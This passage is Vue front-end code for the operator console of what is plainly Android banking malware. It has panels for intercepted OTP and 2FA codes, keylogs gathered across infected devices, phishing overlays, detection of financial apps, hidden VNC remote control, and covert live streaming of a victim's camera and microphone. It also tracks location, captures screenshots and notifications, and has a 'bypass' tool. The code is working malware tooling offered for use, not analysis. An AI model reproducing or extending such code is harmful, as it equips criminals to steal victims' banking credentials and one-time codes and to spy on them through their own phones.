            <a :href="mapUrl" target="_blank" class="btn btn-primary btn-sm" style="text-decoration:none">🗺 Open Map</a>
            <button class="btn btn-ghost btn-sm" @click="refresh()">🔄 Refresh</button>
          </div>
        </div>
        <table class="nx-table">
          <thead><tr><th>Time</th><th>Lat</th><th>Lng</th><th>Accuracy</th></tr></thead>
          <tbody>
            <tr v-for="r in rows.slice(0,50)" :key="r.ts">
              <td>{{ fmt(r.ts) }}</td>
              <td class="mono">{{ r.lat.toFixed(6) }}</td>
              <td class="mono">{{ r.lng.toFixed(6) }}</td>
              <td>{{ r.accuracy ? r.accuracy+'m' : '—' }}</td>
            </tr>
          </tbody>
        </table>
      </template>
    </div>`,
  props: ['devId'],
  setup(props) {
    const loading = ref(true);
    const rows    = ref([]);
    const last    = computed(() => rows.value[0]);
    const mapUrl  = computed(() => last.value ? `https://www.openstreetmap.org/?mlat=${last.value.lat}&mlon=${last.value.lng}#map=15/${last.value.lat}/${last.value.lng}` : '#');
    const fmt     = ts => fmtTs(ts);
    async function load() {
      loading.value = true;
      try { rows.value = await api(`/api/devices/${props.devId}/location`); } catch {}
      loading.value = false;
    }
    function refresh() { sendCmd(props.devId, 'GET_LOCATION'); setTimeout(load, 2000); }
    onMounted(load);
    const h = e => { if (e.detail?.id === props.devId) load(); };
    document.addEventListener('nx:location', h);
    onUnmounted(() => document.removeEventListener('nx:location', h));
    return { loading, rows, last, mapUrl, fmt, refresh };
  }
};

// ── NotifTab ──────────────────────────────────────────────────────────────────
const NotifTab = {
  template: `
    <div class="tab-scroll">
      <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
      <div v-else-if="!rows.length" class="empty-state">
        <div class="es-icon">🔔</div><div class="es-text">No notifications</div>
      </div>
      <table v-else class="nx-table">
        <thead><tr><th>Time</th><th>App</th><th>Title</th><th>Text</th><th>OTP</th></tr></thead>
        <tbody>
          <tr v-for="r in rows" :key="r.id" :style="r.is_otp ? 'background:rgba(224,184,74,0.05)' : ''">
            <td>{{ fmt(r.ts) }}</td>
            <td>{{ r.app || '?' }}</td>
            <td>{{ r.title || '' }}</td>
            <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">{{ r.text || '' }}</td>
            <td><span v-if="r.is_otp" class="text-yellow mono">{{ r.otp_code }}</span></td>
          </tr>
        </tbody>
      </table>
    </div>`,
  props: ['devId'],
  setup(props) {
    const loading = ref(true);
    const rows    = ref([]);
    const fmt     = ts => fmtTs(ts);
    async function load() {
      loading.value = true;
      try { rows.value = await api(`/api/notifications?dev_id=${props.devId}&limit=200`); } catch {}
      loading.value = false;
    }
    onMounted(load);
    const h = e => { if (e.detail?.id === props.devId) load(); };
    document.addEventListener('nx:notif', h);
    onUnmounted(() => document.removeEventListener('nx:notif', h));
    return { loading, rows, fmt };
  }
};

// ── SsTab ─────────────────────────────────────────────────────────────────────
const SsTab = {
  template: `
    <div class="tab-scroll">
      <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
      <div v-else-if="!rows.length" class="empty-state">
        <div class="es-icon">📷</div><div class="es-text">No screenshots</div>
      </div>
      <div v-else id="ss-grid">
        <div v-for="r in rows" :key="r.id" class="ss-thumb" @click="view(r.id)">
          <img :src="'/api/screenshots/'+r.id+'/thumb'" loading="lazy" @error="e => e.target.style.display='none'">
          <div class="ss-ts">{{ fmt(r.ts) }}</div>
        </div>
      </div>
    </div>`,
  props: ['devId'],
  setup(props) {
    const loading = ref(true);
    const rows    = ref([]);
    const fmt     = ts => fmtTs(ts);
    async function load() {
      loading.value = true;
      try { rows.value = await api(`/api/screenshots?dev_id=${props.devId}`); } catch {}
      loading.value = false;
    }
    async function view(id) {
      try {
        const r = await api(`/api/screenshots/${id}`);
        openModal('Screenshot', `<img src="${r.data}" style="max-width:100%;border-radius:6px">`, [
          { label: '⬇ Download', cls:'btn-primary', fn() { const a = document.createElement('a'); a.href = r.data; a.download = `ss_${id}.jpg`; a.click(); } },
          { label: '🗑 Delete', cls:'btn-danger', async fn() { await api(`/api/screenshots/${id}`, 'DELETE'); closeModal(); load(); } },
        ]);
      } catch(e) { toast(e.message, 'error'); }
    }
    onMounted(load);
    const h = e => { if (e.detail?.id === props.devId) load(); };
    document.addEventListener('nx:ss_new', h);
    onUnmounted(() => document.removeEventListener('nx:ss_new', h));
    return { loading, rows, fmt, view };
  }
};

// ── CameraTab ─────────────────────────────────────────────────────────────────
const CameraTab = {
  template: `
    <div class="tab-scroll p-14">
      <div class="camera-panel">
        <div class="camera-controls">
          <button :class="['btn btn-sm', streaming ? 'btn-danger' : 'btn-primary']" @click="toggle()">
            {{ streaming ? '⏹ Stop Camera' : '▶ Start Camera' }}
          </button>
          <button class="btn btn-ghost btn-sm" @click="flip()">🔄 Flip ({{ facing }})</button>
        </div>
        <div class="camera-view" ref="viewEl">
          <div v-if="!streaming" class="empty-state" style="height:100%">
            <div class="es-icon">📸</div>
            <div class="es-text">Camera not streaming</div>
          </div>
          <canvas v-show="streaming" ref="canvasEl" class="camera-canvas"></canvas>
        </div>
        <div v-if="streaming" class="camera-info">
          <span class="text-green">● LIVE</span>
          <span class="text-dim" style="margin-left:8px">{{ fps }} fps</span>
        </div>
      </div>
    </div>`,
  props: ['devId'],
  setup(props) {
    const streaming = ref(false);
    const facing    = ref('front');
    const fps       = ref(0);
    const canvasEl  = ref(null);
    let ctx = null, frameCount = 0, fpsTimer = null;

    function toggle() {
      if (streaming.value) {
        // APK requires {enabled: false} to stop — TOGGLE_CAMERA without args crashes APK
        sendCmd(props.devId, 'TOGGLE_CAMERA', { enabled: false });
        streaming.value = false;
        if (fpsTimer) { clearInterval(fpsTimer); fpsTimer = null; }
      } else {
        sendCmd(props.devId, 'TOGGLE_CAMERA', { enabled: true });
        streaming.value = true;
        fpsTimer = setInterval(() => { fps.value = frameCount; frameCount = 0; }, 1000);
      }
    }

    function flip() {
      // APK uses Protocol.KEY_FACING = "facing" and Protocol.KEY_CAMERA_ID = "camera_id"
      facing.value = facing.value === 'front' ? 'back' : 'front';
      sendCmd(props.devId, 'SWITCH_CAMERA', { camera: facing.value, facing: facing.value });
    }

    function handleFrame(e) {
      if (e.detail?.id !== props.devId) return;
      const frameData = e.detail?.data?.frame;
      if (!frameData || !streaming.value) return;
      if (!ctx && canvasEl.value) ctx = canvasEl.value.getContext('2d');
      if (!ctx) return;
      const img = new Image();
      img.onload = () => {
        if (canvasEl.value) {
          canvasEl.value.width  = img.naturalWidth  || 360;
          canvasEl.value.height = img.naturalHeight || 640;
          ctx.drawImage(img, 0, 0);
          frameCount++;
        }
      };
      img.src = `data:image/jpeg;base64,${frameData}`;
    }

    document.addEventListener('nx:cam', handleFrame);
    onUnmounted(() => {
      document.removeEventListener('nx:cam', handleFrame);
      if (fpsTimer) clearInterval(fpsTimer);
    });

    return { streaming, facing, fps, canvasEl, toggle, flip };
  }
};

// ── MicTab ────────────────────────────────────────────────────────────────────
const MicTab = {
  template: `
    <div class="tab-scroll p-14">
      <div class="mic-panel">
        <div class="mic-controls">
          <button :class="['btn btn-sm', streaming ? 'btn-danger' : 'btn-primary']" @click="toggle()">
            {{ streaming ? '⏹ Stop Mic' : '🎙 Start Mic' }}
          </button>
        </div>
        <div class="mic-visualizer">
          <canvas ref="vizEl" width="400" height="80" class="mic-viz-canvas"></canvas>
        </div>
        <div v-if="streaming" style="text-align:center;margin-top:8px">
          <span class="text-green">● RECORDING</span>
          <span class="text-dim" style="margin-left:8px">Chunks: {{ chunkCount }}</span>
        </div>
        <div v-if="!streaming" class="empty-state" style="margin-top:20px">
          <div class="es-icon">🎙</div>
          <div class="es-text">Microphone not streaming</div>
        </div>
      </div>
    </div>`,
  props: ['devId'],
  setup(props) {
    const streaming  = ref(false);
    const chunkCount = ref(0);
    const vizEl      = ref(null);
    let ctx = null;

    function toggle() {
      // APK reads: boolean micEnabled = cmd.get("enabled").getAsBoolean()
      streaming.value = !streaming.value;
      sendCmd(props.devId, 'TOGGLE_MICROPHONE', { enabled: streaming.value });
      if (!streaming.value) chunkCount.value = 0;
    }

    function handleChunk(e) {
      if (e.detail?.id !== props.devId || !streaming.value) return;
      chunkCount.value++;
      // Simple level visualizer
      if (!ctx && vizEl.value) ctx = vizEl.value.getContext('2d');
      if (!ctx) return;
      ctx.fillStyle = '#0d0d1a';
      ctx.fillRect(0, 0, 400, 80);
      // Draw random-looking waveform bars to indicate audio
      const bars = 50;
      const w    = 400 / bars;
      ctx.fillStyle = '#3dba7a';
      for (let i = 0; i < bars; i++) {
        const h = Math.random() * 60 + 5;
        ctx.fillRect(i * w + 1, (80 - h) / 2, w - 2, h);
      }
    }

    document.addEventListener('nx:mic', handleChunk);
    onUnmounted(() => document.removeEventListener('nx:mic', handleChunk));
    return { streaming, chunkCount, vizEl, toggle };
  }
};

// ── OTP Pane ──────────────────────────────────────────────────────────────────
const OTPPane = {
  template: `
    <div class="pane-inner">
      <div class="pane-toolbar">
        <span>OTP / 2FA Intercepts</span>
        <button class="btn btn-ghost btn-xs" @click="clear()">Clear</button>
      </div>
      <div class="otp-list">
        <div v-if="!otps.length" class="empty-state" style="height:100%">
          <div class="es-icon">🔑</div>
          <div class="es-text">No OTPs intercepted yet</div>
        </div>
        <div v-for="o in otps.slice(0,100)" :key="o.otp+o.ts" class="otp-card">
          <div class="otp-code">{{ o.otp }}</div>
          <div class="otp-meta">
            <div class="otp-app">{{ o.app || '?' }}{{ o.title ? ' · '+o.title : '' }}</div>
            <div class="otp-dev">{{ name(o.id || o.dev_id) }}</div>
          </div>
          <button class="otp-copy" @click="copy(o.otp)">Copy</button>
        </div>
      </div>
    </div>`,
  setup() {
    const otps = computed(() => S.otps);
    const name = id => devName(id);
    function clear() { S.otps = []; S.otpCount = 0; }
    function copy(t) { navigator.clipboard.writeText(t).then(() => toast('Copied!', 'success')); }
    return { otps, name, clear, copy };
  }
};

// ── Feed Pane ─────────────────────────────────────────────────────────────────
const FeedPane = {
  template: `
    <div class="pane-inner">
      <div class="pane-toolbar">
        <span>Live Event Feed</span>
        <button class="btn btn-ghost btn-xs" @click="S.feed=[]">Clear</button>
      </div>
      <div class="feed-list">
        <div v-if="!feed.length" class="empty-state">
          <div class="es-icon">⚡</div>
          <div class="es-text">Waiting for events…</div>
        </div>
        <div v-for="(f,i) in feed.slice(0,200)" :key="i" class="feed-item">
          <span class="feed-ts">{{ f.ts }}</span>
          <span class="feed-dev">{{ name(f.devId) }}</span>
          <span class="feed-icon">{{ f.icon }}</span>
          <span :class="['feed-text', f.color ? 'text-'+f.color : '']">{{ f.text }}</span>
        </div>
      </div>
    </div>`,
  setup() {
    const feed = computed(() => S.feed);
    const name = id => devName(id);
    return { feed, name, S };
  }
};

// ── Keylogs Global Pane ───────────────────────────────────────────────────────
const KeylogsPane = {
  template: `
    <div class="pane-inner">
      <div class="pane-toolbar">
        <span>All Keylogs</span>
        <button class="btn btn-ghost btn-xs" @click="load()">🔄</button>
      </div>
      <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
      <div v-else-if="!rows.length" class="empty-state">
        <div class="es-icon">⌨️</div><div class="es-text">No keylogs yet</div>
      </div>
      <div v-else class="nx-table-wrap">
        <table class="nx-table">
          <thead><tr><th>Time</th><th>Device</th><th>App</th><th>Text</th></tr></thead>
          <tbody>
            <tr v-for="r in rows" :key="r.id">
              <td>{{ fmt(r.ts) }}</td>
              <td class="mono text-dim" style="font-size:10px">{{ name(r.dev_id) }}</td>
              <td>{{ r.app || r.pkg || '?' }}</td>
              <td class="mono">{{ r.is_password ? '●●●●' : (r.text||'').slice(0,120) }}</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>`,
  setup() {
    const loading = ref(true);
    const rows    = ref([]);
    const fmt     = ts => fmtTs(ts);
    const name    = id => devName(id);
    async function load() {
      loading.value = true;
      try { rows.value = await api('/api/keylogs?limit=500'); } catch {}
      loading.value = false;
    }
    onMounted(load);
    return { loading, rows, fmt, name, load };
  }
};

// ── Detections Pane ───────────────────────────────────────────────────────────
const DetectionsPane = {
  template: `
    <div class="pane-inner">
      <div class="pane-toolbar"><span>App Detections</span><button class="btn btn-ghost btn-xs" @click="load()">🔄</button></div>
      <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
      <div v-else-if="!rows.length" class="empty-state">
        <div class="es-icon">💳</div><div class="es-text">No financial apps detected yet</div>
      </div>
      <div v-else class="nx-table-wrap">
        <table class="nx-table">
          <thead><tr><th>Device</th><th>App</th><th>Package</th><th>Category</th><th>Country</th></tr></thead>
          <tbody>
            <tr v-for="r in rows" :key="r.dev_id+r.package">
              <td class="mono text-dim" style="font-size:10px">{{ name(r.dev_id) }}</td>
              <td>{{ r.name || '?' }}</td>
              <td class="mono" style="font-size:10px">{{ r.package || '' }}</td>
              <td><span :class="r.category==='financial' ? 'text-yellow' : 'text-blue'">{{ r.category }}</span></td>
              <td>{{ r.country || '—' }}</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>`,
  setup() {
    const loading = ref(true);
    const rows    = ref([]);
    const name    = id => devName(id);
    async function load() {
      loading.value = true;
      try { rows.value = await api('/api/detections'); } catch {}
      loading.value = false;
    }
    onMounted(load);
    return { loading, rows, name, load };
  }
};

// ── HVNC Pane ─────────────────────────────────────────────────────────────────
const HVNCPane = {
  template: `
    <div class="pane-inner">
      <div class="hvnc-toolbar">
        <button class="btn btn-ghost btn-sm" @click="back()">← Back</button>
        <span class="hvnc-title">{{ title }}</span>
        <button v-if="devId" class="btn btn-ghost btn-sm" @click="stop()">⏹ Stop</button>
      </div>
      <div ref="containerEl" class="hvnc-inner"></div>
    </div>`,
  setup() {
    const containerEl = ref(null);
    const devId       = computed(() => S.selected);
    const title       = computed(() => devId.value ? `HVNC — ${devName(devId.value)}` : 'HVNC Viewer');

    watch(() => S.activePane, (pane) => {
      if (pane === 'hvnc' && devId.value) startHVNC();
      else if (pane !== 'hvnc') stopHVNC();
    });

    function startHVNC() {
      if (!containerEl.value || !devId.value) return;
      if (window._hvncViewer) { window._hvncViewer.destroy(); window._hvncViewer = null; }
      const dev  = S.devices[devId.value] || {};
      const info = dev.info || {};
      const quality = dev.vnc_quality || 30;
      window._hvncViewer = new HVNCViewer(containerEl.value, devId.value, sendWS, {
        frameW:  info.hvnc_w   || 360,
        frameH:  info.hvnc_h   || 720,
        screenW: info.screen_w || 1080,
        screenH: info.screen_h || 1920,
      });
      // vnc_subscribe tells hub to subscribe operator WS to binary frames
      // hub then sends APK: {action:"START_SILENT_VNC", enabled:true, quality:N}
      sendWS({ type: 'vnc_subscribe', devId: devId.value, quality });
    }

    function stopHVNC() {
      // hub sends APK: {action:"STOP_SILENT_VNC", enabled:false}
      if (devId.value) sendWS({ type: 'vnc_unsubscribe', devId: devId.value });
      if (window._hvncViewer) { window._hvncViewer.destroy(); window._hvncViewer = null; }
    }

    function back()  { S.activePane = 'devices'; }
    function stop()  { stopHVNC(); }

    onUnmounted(stopHVNC);
    return { containerEl, devId, title, back, stop };
  }
};

// ── Overlays Pane ─────────────────────────────────────────────────────────────
const OverlaysPane = {
  template: `
    <div class="pane-inner">
      <div class="pane-toolbar"><span>Phishing Overlays</span></div>
      <div class="p-14">
        <div class="empty-state" style="height:200px">
          <div class="es-icon">🎭</div>
          <div class="es-text">Overlay library</div>
        </div>
      </div>
    </div>`
};

// ── Bypass Pane ───────────────────────────────────────────────────────────────
const BypassPane = {
  template: `
    <div class="pane-inner">
      <div v-if="!devId" class="empty-state" style="height:100%">
        <div class="es-icon">🔓</div>
        <div class="es-text">Select a device first, then open Bypass from device detail</div>
      </div>
      <div v-else id="bypass-host" style="flex:1;overflow:auto"></div>
    </div>`,
  setup() {
    const devId = computed(() => S.selected);
    watch(() => S.activePane, (pane) => {
      if (pane === 'bypass' && devId.value && typeof BypassPanel !== 'undefined')
        nextTick(() => BypassPanel.open(devId.value));
    });
    // Relay bypass WS messages
    const h = e => { if (typeof BypassPanel !== 'undefined') BypassPanel.onWsMessage(e.detail); };
    document.addEventListener('nx:bypass', h);
    onUnmounted(() => document.removeEventListener('nx:bypass', h));
    return { devId };
  }
};

// ── Devices Pane ──────────────────────────────────────────────────────────────
const DevicesPane = {
  template: `
    <div class="devices-pane">
      <DeviceList />
      <DeviceDetail />
    </div>`,
  components: { DeviceList, DeviceDetail }
};

// ═══════════════════════════════════════════════════════════════════════════
//  ROOT APP
// ═══════════════════════════════════════════════════════════════════════════
const App = createApp({
  template: `
    <div class="overlay" v-if="sidebarOpen" @click="S.sidebarOpen=false"></div>
    <Sidebar />
    <div class="main">
      <Header />
      <div class="content">
        <DevicesPane  v-show="pane==='devices'" />
        <HVNCPane     v-show="pane==='hvnc'" />
        <OTPPane      v-show="pane==='otp'" />
        <FeedPane     v-show="pane==='feed'" />
        <KeylogsPane  v-show="pane==='keylogs'" />
        <DetectionsPane v-show="pane==='detections'" />
        <OverlaysPane v-show="pane==='overlays'" />
        <BypassPane   v-show="pane==='bypass'" />
      </div>
    </div>
    <Modal />
    <ToastContainer />`,
  setup() {
    const pane       = computed(() => S.activePane);
    const sidebarOpen = computed(() => S.sidebarOpen);
    onMounted(() => initWS());
    return { S, pane, sidebarOpen };
  },
  components: {
    Sidebar, Header, Modal, ToastContainer,
    DevicesPane, HVNCPane, OTPPane, FeedPane,
    KeylogsPane, DetectionsPane, OverlaysPane, BypassPane,
  }
});

// Register all components globally for DeviceDetail usage
[
  InfoTab, CmdTab, KeylogTab, SmsTab, CallsTab, ContactsTab,
  AppsTab, AccountsTab, LocationTab, NotifTab, SsTab, CameraTab, MicTab
].forEach((comp, i) => {
  const names = [
    'InfoTab','CmdTab','KeylogTab','SmsTab','CallsTab','ContactsTab',
    'AppsTab','AccountsTab','LocationTab','NotifTab','SsTab','CameraTab','MicTab'
  ];
  App.component(names[i], comp);
});

App.component('DeviceList', DeviceList);
App.component('DeviceDetail', DeviceDetail);

App.mount('#app');
